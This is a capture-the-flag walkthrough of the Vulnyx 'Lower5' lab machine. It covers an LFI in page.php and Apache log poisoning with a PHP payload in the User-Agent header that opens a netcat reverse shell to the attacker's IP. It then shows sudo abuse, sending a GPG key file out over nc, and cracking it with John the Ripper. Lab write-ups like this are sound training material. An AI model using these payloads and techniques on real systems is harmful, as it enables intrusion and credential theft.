# 🖥️ Writeup - Lower5

**Platform:** Vulnyx  
**Operating System:** Linux  

# INSTALLATION

We download the `zip` containing the `.ova` of the Lower5 machine, extract it, and import it into VirtualBox.

We configure the network interface of the Lower5 machine and run it alongside the attacker machine.

# HOST DISCOVERY

At this point, we still don’t know which `IP` address is assigned to Lower5, so we discover it as follows:

```bash
netdiscover -i eth1 -r 10.0.0.0/16
```
Info:
```
Currently scanning: 10.0.0.0/16   |   Screen View: Unique Hosts               
                                                                               
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240               
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 10.0.4.1        52:54:00:12:35:00      1      60  Unknown vendor              
 10.0.4.2        52:54:00:12:35:00      1      60  Unknown vendor              
 10.0.4.3        08:00:27:14:65:c8      1      60  PCS Systemtechnik GmbH      
 10.0.4.31       08:00:27:33:a7:76      1      60  PCS Systemtechnik GmbH
 ```

 We identify with high confidence that the victim’s IP is `10.0.4.31`.

 # PORT SCANNING

Next, we perform a general scan to check which ports are open, followed by a more exhaustive scan to gather relevant service information.

```bash
nmap -n -Pn -sS -sV -p- --open --min-rate 5000 10.0.4.31
``` 

```bash
nmap -n -Pn -sCV -p22,80 --min-rate 5000 10.0.4.31
```
Info:
```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-12-05 16:11 CET
Nmap scan report for 10.0.4.31
Host is up (0.00022s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.2p1 Debian 2+deb12u5 (protocol 2.0)
| ssh-hostkey: 
|   256 a9:a8:52:f3:cd:ec:0d:5b:5f:f3:af:5b:3c:db:76:b6 (ECDSA)
|_  256 73:f5:8e:44:0c:b9:0a:e0:e7:31:0c:04:ac:7e:ff:fd (ED25519)
80/tcp open  http    Apache httpd 2.4.62 ((Debian))
|_http-title: vTeam a Corporate Multipurpose Free Bootstrap Responsive template
|_http-server-header: Apache/2.4.62 (Debian)
MAC Address: 08:00:27:33:A7:76 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 6.68 seconds
```

We identify ports `22` and `80` as open.

We access the web service on port `80` and encounter the following page:

![alt text](../../images/vteam.png)

If we navigate to `About Us`, we see that the `URL` reveals a possible vulnerability:

![alt text](../../images/page.php.png)

We notice that through the `page.php` file, the `About Us` page is included for us to view. This could very well be vulnerable to `LFI`.

# LFI

We verify this by attempting to view the `/etc/passwd` file, and indeed, it is vulnerable.

```
http://10.0.4.31/page.php?inc=/etc/passwd
```

Info:
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/run/ircd:/usr/sbin/nologin
_apt:x:42:65534::/nonexistent:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
systemd-network:x:998:998:systemd Network Management:/:/usr/sbin/nologin
messagebus:x:100:107::/nonexistent:/usr/sbin/nologin
sshd:x:101:65534::/run/sshd:/usr/sbin/nologin
low:x:1000:1000:low:/home/low:/bin/bash
```

We find a user named `low`.

We cannot do much with this information yet, so we continue looking for interesting files to view.

We discover that we can also view the `/var/log/apache2/access.log` file. This means it is highly probable that the exploitation vector for this machine is `Log Poisoning`.

# LOG POISONING

We use `curl` to send a web request with malicious `PHP` code through the `User-Agent` header.

```bash
curl -s -H "User-Agent: <?php system('busybox nc 10.0.4.12 4444 -e /bin/sh'); ?>" "http://10.0.4.31/"
```

We set up a `listener` on our attacking machine, waiting to receive the connection.

```bash
nc -nlvp 4444
```

Next, we refresh the page `http://10.0.4.31/page.php?inc=/var/log/apache2/access.log`.

Info:
```
listening on [any] 4444 ...
connect to [10.0.4.12] from (UNKNOWN) [10.0.4.31] 53442
whoami
www-data
```

We receive the shell on our `listener` as the `www-data` user.

# TTY

Before attempting privilege escalation, we upgrade the `TTY` for a more interactive shell:

```bash
script /dev/null -c bash
```
`ctrl Z`
```bash
stty raw -echo; fg
```
```bash
reset xterm
```
```bash
export TERM=xterm
```
```bash
export BASH=bash
```

# PRIVILEGE ESCALATION

We check for `sudo` and `SUID` permissions.

```bash
sudo -l
```

Info:
```
Matching Defaults entries for www-data on lower5:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User www-data may run the following commands on lower5:
    (low) NOPASSWD: /usr/bin/bash
```

We can execute the `bash` binary with the permissions of the `low` user. We can easily abuse this privilege in order to perform lateral movement to the user `low` .

```bash
sudo -u low /usr/bin/bash -i
```

Info:
```
low@lower5:/var/www/html$ whoami
low
low@lower5:/var/www/html$
```

Once we become the `low` user, we check for `sudo` and `SUID` permissions again.

```bash
sudo -l
```

Info:
```
Matching Defaults entries for low on lower5:
    env_reset, mail_badpass,
    secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin,
    use_pty

User low may run the following commands on lower5:
    (root) NOPASSWD: /usr/bin/pass
```

We can execute the `pass` binary with `root` privileges.
We run it to see what it does.

```bash
sudo -u root /usr/bin/pass
```

Info:
```
Password Store
`-- root
    `-- password
```

It seems to contain the stored `root` password. We attempt to access it.

```bash
sudo -u root /usr/bin/pass root/password
```

Cannot view it because it asks for a passphrase.

In the `/home/low` directory, we find a `root.gpg` file. To crack it, we first need to transfer it to our attacking machine.

```bash
nc 10.0.4.12 4443 < root.gpg
```

We set up a `listener` on our attacking machine to receive the file.

```bash
nc -nlvp 4443 > root.gpg
```

Next, we run the command on the victim machine.

Info:
```
listening on [any] 4443 ...
connect to [10.0.4.12] from (UNKNOWN) [10.0.4.31] 52858
^C
```

Now that we have transferred it, we use the `gpg2john` module from `John The Ripper` to crack it.

```bash
gpg2john root.gpg > hash
john --wordlist=/usr/share/wordlists/rockyou.txt hash
```

Info:
```
Using default input encoding: UTF-8
Loaded 1 password hash (gpg, OpenPGP / GnuPG Secret Key [32/64])
Cost 1 (s2k-count) is 65011712 for all loaded hashes
Cost 2 (hash algorithm [1:MD5 2:SHA1 3:RIPEMD160 8:SHA256 9:SHA384 10:SHA512 11:SHA224]) is 2 for all loaded hashes
Cost 3 (cipher algorithm [1:IDEA 2:3DES 3:CAST5 4:Blowfish 7:AES128 8:AES192 9:AES256 10:Twofish 11:Camellia128 12:Camellia192 13:Camellia256]) is 7 for all loaded hashes
Will run 2 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
Password1        (administrator)     
1g 0:00:00:55 DONE (2025-12-07 22:08) 0.01798g/s 63.06p/s 63.06c/s 63.06C/s Password1..wateva
```

We find the password: `Password1`.

```bash
sudo -u root /usr/bin/pass root/password
```

We enter the passphrase `Password1` and see the root password: `r00tP@zzW0rD123`.

We authenticate using this password.

```bash
su root
```

Info:
```
root@lower5:/home/low# whoami
root
root@lower5:/home/low#
```

We are now root!

We obtain the `user flag` and the `root flag`:

```
root@lower5:/home/low# cat user.txt 
30a7b18992fef054ca6d904769fac413
root@lower5:/home/low# cat /root/root.txt 
008cdc7563e1d5afbcac3a241eba4db8
```